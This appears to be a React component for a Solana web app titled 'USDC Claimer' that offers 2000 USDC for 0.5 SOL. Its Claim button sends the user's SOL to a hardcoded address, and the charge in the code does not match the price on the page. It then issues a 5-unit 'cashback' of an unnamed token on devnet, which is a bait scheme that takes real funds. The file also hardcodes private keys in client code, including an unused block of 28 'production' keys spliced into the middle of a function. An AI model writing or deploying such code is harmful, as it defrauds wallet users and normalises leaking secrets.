/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "65GNMmEminuWh5W3ijdB5XDTPdMXpWaPLG2xPZLUMJBx4nGbutJ7pZjayU7dqEzMG4UshStyCcRefbSETzTakeaf"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "5E62PKqDaCgMphapHebSBSCwPMEGzttS9EdYUgUNozSeUvKeAiLru2Y4hwAkQ7cEXazjAkx9U6hVfCn4zMeuJsYS",
  "key1": "5Dx9u56zi6tyqgc3GSv3ec7PZSXgrFtsyxnQBnHusno8KyTKdptJHmVBVDehf81oSVSDRSZ1vTzt3kyi6DpjZB2B",
  "key2": "4Gf7osaQuJhF1AMpbUVM8kroYEfkVJtovnEv6uPe1V4P7HfYaYNkLDNitK4asi6FgUN5UGzVrZX4pLTGtbHDVEzs",
  "key3": "3WkVWnXEmxX5A8QDFozWgFqQ4NJAkVqcVeuDgxCYW15uuykzx5DpNaPmHHTJ4xW8CHARJGdkriBuGczZGwEYGbgZ",
  "key4": "3YS2atMUGHTAebb5GjLxefYNggWXV2AzGrsPemg1ZQTBdJdUmmj4rpwT1zZqCYyA2MPJxveioYvZgxXuBfncBjZW",
  "key5": "2QNnEUtghM7sDTzfr1Vaa662SZQNtFtmQbEdvda6Cwu8tYbjzA2iJ9NZQaj4odUqLXeJTYysv92AK47hLBKCtcru",
  "key6": "2NAJHCKtBavgAd3E783PmeEaq7dPBVuPUduohejXBs6kNZeZcjXk9qfVU3SMMEjWYL1qbz2MhGdzz6ayd2pZ659d",
  "key7": "Zg8CQNiCRruYCEJcenuCiy7MgGWGSXVfuoYjCUcs1ZwoEjh3xbssywzwSL2AzW9dmDzpC8F28kd9a7a8tsrnXmo",
  "key8": "3YGhXFazvijDPhbhCJmkAjjTFS5jSGVH7gY5xb54YBHNF24Bk76AcheST8XAvNN4Z27HArfNnE7cdKEwePDr2Rkp",
  "key9": "3C5wrWBHe2gTqu7i5xkhHLi1hqqfFdsAAL4PjPQfhxrCEk5QYU54B2io5b1s35RobwkiArCUqqBN8ruQTrNMtypJ",
  "key10": "zeNFwrmfBttXWJZHDLT5cdLabGdkVWYEJsatYWFAqBuVTuPiHUoDkqvUzZe2PTwzEhZeTjtW5qMa6JJHYJ4gnph",
  "key11": "2xBGpvk67g73wW1LKtAA3Jax9MYzDErSHtWBXee5nqZ3RLqcepvtK2kEwisEXsFbfcUSwPZpr7NQyfLk6jrzgDax",
  "key12": "2mGbZa55qomgXrCDQ57MzyN6gDu3NnUQjfRSU5w2SrrnAxy9Vk622sePxjZcSMeYGsPfcPxa2jYscpHGzohZeemw",
  "key13": "5gg25Y1mXaYnojwmAQnUvt51uEJmRYpeZzmGDW6K52jw874JXDgRePW6Xuf4XiKV4bs3mY3hDrTwiobiXSWg7YD7",
  "key14": "1bwHpvqp82mvP4nfhhwpSe4TFdmtYcNKwvyLiwPNPhadFAbR9d6ccbQKR9Xf3fvzf2MdubDu4ejb7UDXxbTgg2a",
  "key15": "2odxeBxCSkfsrrvjnRTULyeGRgFBbepsZtCf8vnQVjvMAewX7ZwA4tZisgGzVhneP1ZLk1AuxFzTK2Vut6BUkGFD",
  "key16": "V9LcDFmfpsVKkRdwEM4cEzqyLncb2E83X2HyZZdkS3iMFxLNu2Po7zDKQxUUkqrhCgPSkmtgmtcY6VguuKDUsCB",
  "key17": "3rE6hvKU7RJcpbar9Cb84tx9HWjAPd2xpcMdYBUZa9KgqUhPFNZKE5s2rLsoj5xMLXxPAaWcoyZDw7HT4s4BqN1z",
  "key18": "4MrGpHjBQcTUdmXHaiPEHonCc31TbNhLVzoxW38MqGVbZugkfS1e75BhmHqrRWGEHRQRfdNbeVFHZTUQD11Mrx5q",
  "key19": "4zQn2K87a6BC7LQWj9MWmeQLs3NHk1vLviiUaYy6QG1aLMR6bfFEQkkd5NsuT9pybjRjHAE5BptE3R2L9v9w6WqU",
  "key20": "4yG9hsPFrQejGdkkmRNm7bM4JdQszwfCznQ2zvnrBd2abUEJKY8yFccuCtgFLFEC2xVKw4trSPhQ1yEPUcHVSduo",
  "key21": "tVWsFjfiX8VTy9oGVfHJXurBWPg5zBWEAXiis1DruBoBaZFgcx68n8ipnscC5tY1z5gF4cRAoBLorebsWxpsx7M",
  "key22": "247ge8BDymddNgwBEzrFU8czvfxLnJYfmQUDrYbMifohh3h5413iePUd3sHLqNw9gPi1hNtrX9AM3NNiQwus29Zo",
  "key23": "5iiaqP2X7g7TGBC7j6MMSpFXwdJ1yshvNewHHgKHbsdKVNwQZ2e8GRAFR6yfepCHcfAWwWtf1QYwjuRMiuXRNgkp",
  "key24": "3M4nHWpMhCX3cTfaZAycw4kyQw7wgAZRTL4GRfpYsT8XeXKZHSqgRUxMA9knxJEfFK3cP1UHEeGSY2dALoTF9Ast",
  "key25": "5NjqzfEtMPGQxv5EYJgCikwT9g4CBi5CTNhmJVD8hHX7eG73pSNM4d8GMu4BMnMKFH3iQQqiinboPgdo41XLUbTp",
  "key26": "35dEcouvv7B6LryCcDJP1uaG5TTmkgvRWXg7FnD19mcqmEu9FqUWEbNLM7tRxn87bUbZ7VF3scwaHy52NNe7FACK",
  "key27": "2wcfD6sSXTQenkSdD1DeJhE7LfvnKRpDyLXPpEcN2vLkvrR4JwMYM1UWqb3LxYidxMEndv4NHzxqFkqwmDSKeum8"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
